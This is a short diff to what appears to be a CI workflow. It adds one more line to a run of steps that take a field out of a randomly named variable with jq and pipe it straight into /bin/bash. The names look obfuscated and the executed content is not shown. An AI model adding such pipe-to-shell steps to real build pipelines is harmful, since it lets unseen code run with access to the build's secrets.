@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$snwsk80" | jq -r .wtws0715 | /bin/bash
           printf '%s' "$teh53685" | jq -r .zkqfx3476 | /bin/bash
           printf '%s' "$yo1" | jq -r .xkpw04 | /bin/bash
+          echo $kve5 | jq -r .v445 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
